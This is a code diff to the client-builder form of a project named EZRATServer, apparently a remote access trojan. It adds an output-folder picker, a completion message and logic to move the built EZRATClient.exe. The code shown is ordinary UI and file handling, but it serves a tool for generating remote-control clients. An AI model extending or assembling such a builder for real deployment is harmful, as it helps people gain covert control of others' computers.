@@ -18,8 +18,8 @@ namespace EZRATServer.Forms
     public partial class ClientBuilder : Form
     {
         private bool _optionsAdvanced = false;
-        private Size _normalSize = new Size(365, 250);
-        private Size _advancedSize = new Size(675, 250);
+        private Size _normalSize = new Size(365, 310);
+        private Size _advancedSize = new Size(675, 310);
 
         public bool OptionsAdvanced { get => _optionsAdvanced; set => _optionsAdvanced = value; }
 
@@ -27,13 +27,26 @@ namespace EZRATServer.Forms
         {
             InitializeComponent();
             this.tbxIP.Text = GetLanIp();
+            this.tbxOutput.Text = Environment.CurrentDirectory;
             this.btnBuild.Click += Builder;
             this.lblOptions.Click += AdvancedOptions;
             this.btnSearch.Click += SearchingBuild;
             this.btnSearchingClient.Click += SearchingClient;
+            this.btnOutput.Click += SearchingOutput;
             this.Size = _normalSize;
         }
 
+
+        private void SearchingOutput(object sender, EventArgs e)
+        {
+
+            FolderBrowserDialog fld = new FolderBrowserDialog();
+            fld.RootFolder = Environment.SpecialFolder.Desktop;
+            if (fld.ShowDialog() == DialogResult.OK)
+            {
+                this.tbxOutput.Text = fld.SelectedPath;
+            }
+        }
         private void SearchingBuild(object sender, EventArgs e)
         {
             OpenFileDialog opf = new OpenFileDialog();
@@ -50,8 +63,8 @@ namespace EZRATServer.Forms
         {
             OpenFileDialog opf = new OpenFileDialog();
             opf.Multiselect = false;
-            opf.InitialDirectory = @"..\..\..\..\EZRATClient\";
-            opf.Filter = "*.csproj|*.csproj";
+            opf.InitialDirectory = Environment.CurrentDirectory;
+            opf.Filter = "EZRATClient.csproj|EZRATClient.csproj";
             opf.Title = "Client project searcher";
             if (opf.ShowDialog() == DialogResult.OK)
             {
@@ -129,6 +142,8 @@ namespace EZRATServer.Forms
                 MoveClient();
                 ResetConstantesValue();
             }
+            MessageBox.Show($"The client {this.tbxName.Text} is created", "Client generated", MessageBoxButtons.OK, MessageBoxIcon.Information);
+            this.Close();
         }
 
 
@@ -166,11 +181,14 @@ namespace EZRATServer.Forms
         private void MoveClient()
         {
             string path = $"{this.tbxClientProj.Text.Substring(0, this.tbxClientProj.Text.LastIndexOf("\\"))}\\bin\\Debug\\EZRATClient.exe";
-            if (File.Exists($"{Environment.CurrentDirectory}\\{this.tbxName.Text}"))
+            string dest = this.tbxOutput.Text + tbxName.Text;
+            if (File.Exists(dest))
             {
-                File.Delete($"{Environment.CurrentDirectory}\\{this.tbxName.Text}");
-                File.Move(path, $"{Environment.CurrentDirectory}\\{this.tbxName.Text}");
+                File.Delete(dest);
+                File.Move(path,dest);
             }
+            else
+                File.Move(path, dest);
         }
 
     }
